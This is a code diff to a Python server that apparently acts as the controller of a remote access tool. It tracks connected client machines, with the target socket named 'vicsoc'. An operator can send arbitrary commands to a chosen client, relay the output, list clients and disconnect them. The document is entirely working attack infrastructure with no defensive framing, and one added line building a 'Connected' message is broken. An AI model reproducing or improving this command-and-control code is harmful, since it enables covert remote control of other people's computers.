@@ -58,7 +58,13 @@ def newcon(soc):
     if username == "auth":
         ver(soc)
     else:
-        
+        try:
+            d = "+++++++++++++++++++++++++"
+            d += "%s Connected", username
+            d += "+++++++++++++++++++++++++\n"
+            adminsock.send(d.encode())
+        except:
+            auth = False
         clients[username] = soc
         user[soc] = username
         unames.append(username)
@@ -80,55 +86,62 @@ def disconnection(s):
         socks.remove(s)
 
 
-def tout(sock, timeout, command):
-    command = command.encode()
-    sock.send(command)
-    ready_sockets, _, _ = select.select([sock], [], [], timeout)
-    if ready_sockets:
-        # Socket is ready for receiving data
-        data = sock.recv(1024)
-        if data:
-            # Process the received message
-            print("Received message:", data.decode())
-    else:
-        # Timeout occurred, no data received
-        return("NOP")
+def tout(sock, adminsock, command):
+    try:
+        sock.send(command.encode())
+        data = sock.recv(1024).decode()
+        print(data, "response")
+        adminsock.send(data.encode())
+    except:
+        adminsock.send(b"Error happened with connected computer :/\n")
 
+
+def kill(username, adminsock):
+    sock = clients[username]
+    disconnection(sock)
+    adminsock.send(b"Killed.\n")
+    sock.close()
+    return
 
 
 def commander(adminsock):
     vicsoc = socket.socket()
     thread.start_new_thread(check, (adminsock, ))
+    time.sleep(0.5)
+    adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\n5) List Options\nChoose Option Number: ")
     while True:
-        time.sleep(1)
-        adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\nChoose Option Number: ")
         option = adminsock.recv(1024).decode().strip()
-        if option== "2":
+        if option == "2":
             thread.start_new_thread(check, (adminsock, ))
+
+        elif option == "5":
+            adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\n5) List Options\n")
+
+        elif option == "3":
+            adminsock.send(b"\nEnter username: ")
+            username = adminsock.recv(1024).decode().strip()
+            thread.start_new_thread(kill, (username,adminsock, ))
+
         elif option == '1':
-            adminsock.send(b"Enter username: ")
+            thread.start_new_thread(check, (adminsock, ))
+            time.sleep(0.5)
+            adminsock.send(b"\nEnter username: ")
             user = adminsock.recv(1024).decode().strip()
             if user in unames:
                 try:
                     adminsock.send(b"Enter Comamand: ")
                     command = adminsock.recv(1024).decode().strip()
-
-                    print(command)
-                    while command != "back":  
-                        vicsoc = clients[user]
-                        #vicsoc.send(command.encode())
-                        res = thread.start_new_thread(tout, (vicsoc, 5, command,))
-                        if res == "NOP":
-                            adminsock.send(b"Timeout")
-                            break
-                        else:
-                            adminsock.send(res.encode())
-                        #resp = vicsoc.recv(1024)
-                        #adminsock.send(resp)
-                        adminsock.send(b"Enter Comamand: ")
+                    vicsoc = clients[user]
+                    while command != "back":
+                        thread.start_new_thread(tout, (vicsoc,adminsock,command, ))
+                        time.sleep(0.5)
+                        adminsock.send(b"\nEnter Comamand: ")
                         command = adminsock.recv(1024).decode().strip()
+                    break
+                    
                 except:
-                    return
+                    break
+        adminsock.send(b"\nChoose Option Number: ")
     return
 
 
@@ -153,16 +166,17 @@ def main():
                     data = sock.recv(1024)
                     if not data:
                         if sock in user:
-                            print(user[sock], 'disconnected')
+                            #print(user[sock], 'disconnected')
                             thread.start_new_thread(disconnection, (sock, ))
                 except:
                     if sock in user:
-                        print(user[sock], 'disconnected')
+                        #print(user[sock], 'disconnected')
+                        thread.start_new_thread(disconnection, (sock, ))
 
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-server_socket.bind(('192.168.1.105', 8080))
+server_socket.bind(('192.168.1.100', 8080))
 server_socket.listen()
 socks.append(server_socket)
 print("Server listening on port 8080...")
